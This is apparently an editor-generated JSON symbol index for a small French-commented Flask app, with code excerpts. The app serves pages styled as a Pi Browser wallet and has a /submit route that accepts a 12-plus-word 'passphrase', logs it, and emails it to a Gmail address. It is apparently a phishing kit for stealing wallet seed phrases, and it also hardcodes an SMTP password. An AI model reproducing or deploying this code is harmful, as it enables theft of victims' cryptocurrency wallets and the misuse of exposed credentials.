[
    {
        "label": "Flask",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "render_template",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "request",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "jsonify",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "Mail",
        "importPath": "flask_mail",
        "description": "flask_mail",
        "isExtraImport": true,
        "detail": "flask_mail",
        "documentation": {}
    },
    {
        "label": "Message",
        "importPath": "flask_mail",
        "description": "flask_mail",
        "isExtraImport": true,
        "detail": "flask_mail",
        "documentation": {}
    },
    {
        "label": "send_passphrase_email",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"üì™ Nouveau PassPhrase Pi Browser re√ßu!\",\n            recipients=['Servicepionner@gmail.com']\n        )\n        msg.html = (",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "index",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def index():\n    return render_template('pi.html')\n@app.route('/main')\ndef menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "menu",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def menu():\n    return render_template('index.html')\n@app.route('/p2p')\ndef piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "piservice",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def piservice():\n    return render_template('p2p.html')\n@app.route('/transaction')\ndef transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # R√©cup√©ration des donn√©es JSON envoy√©es par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "transactservice",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def transactservice():\n    return render_template('transaction.html')\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # R√©cup√©ration des donn√©es JSON envoy√©es par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')\n    # V√©rification de la validit√© de la passphrase\n    if not passphrase or len(passphrase.split()) < 12:\n        return jsonify({'error': 'PassPhrase invalide !'}), 400",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "submit",
        "kind": 2,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "def submit():\n    # R√©cup√©ration des donn√©es JSON envoy√©es par le frontend\n    data = request.get_json()\n    passphrase = data.get('passphrase')\n    # V√©rification de la validit√© de la passphrase\n    if not passphrase or len(passphrase.split()) < 12:\n        return jsonify({'error': 'PassPhrase invalide !'}), 400\n    # Confirmation de la r√©ception de la passphrase\n    print('PassPhrase re√ßue:', passphrase)\n    # Appel de la fonction pour envoyer l'email",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app = Flask(__name__)\napp.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_SERVER']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_PORT']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_USE_SSL']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_USERNAME']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_PASSWORD']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"üì™ Nouveau PassPhrase Pi Browser re√ßu!\",",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "app.config['MAIL_DEFAULT_SENDER']",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "app.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"üì™ Nouveau PassPhrase Pi Browser re√ßu!\",\n            recipients=['Servicepionner@gmail.com']",
        "detail": "app",
        "documentation": {}
    },
    {
        "label": "mail",
        "kind": 5,
        "importPath": "app",
        "description": "app",
        "peekOfCode": "mail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase re√ßue √† l'adresse email configur√©e avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"üì™ Nouveau PassPhrase Pi Browser re√ßu!\",\n            recipients=['Servicepionner@gmail.com']\n        )",
        "detail": "app",
        "documentation": {}
    }
]